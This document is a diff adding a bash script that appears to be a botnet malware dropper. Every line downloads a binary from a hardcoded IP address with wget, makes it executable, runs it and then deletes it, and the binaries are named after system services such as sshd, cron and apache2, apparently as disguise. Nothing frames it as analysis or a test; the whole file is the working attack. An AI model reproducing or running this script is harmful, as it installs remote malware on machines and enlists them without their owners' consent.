@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTSntpd; chmod +x REDSHORTSntpd; ./REDSHORTSntpd; rm -rf REDSHORTSntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTSsshd; chmod +x REDSHORTSsshd; ./REDSHORTSsshd; rm -rf REDSHORTSsshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTSopenssh; chmod +x REDSHORTSopenssh; ./REDSHORTSopenssh; rm -rf REDSHORTSopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTSbash; chmod +x REDSHORTSbash; ./REDSHORTSbash; rm -rf REDSHORTSbash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTStftp; chmod +x REDSHORTStftp; ./REDSHORTStftp; rm -rf REDSHORTStftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTSwget; chmod +x REDSHORTSwget; ./REDSHORTSwget; rm -rf REDSHORTSwget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTScron; chmod +x REDSHORTScron; ./REDSHORTScron; rm -rf REDSHORTScron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTSftp; chmod +x REDSHORTSftp; ./REDSHORTSftp; rm -rf REDSHORTSftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTSpftp; chmod +x REDSHORTSpftp; ./REDSHORTSpftp; rm -rf REDSHORTSpftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTSsh; chmod +x REDSHORTSsh; ./REDSHORTSsh; rm -rf REDSHORTSsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTSshit; chmod +x REDSHORTSshit; ./REDSHORTSshit; rm -rf REDSHORTSshit
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTSapache2; chmod +x REDSHORTSapache2; ./REDSHORTSapache2; rm -rf REDSHORTSapache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.152.204/REDSHORTStelnetd; chmod +x REDSHORTStelnetd; ./REDSHORTStelnetd; rm -rf REDSHORTStelnetd
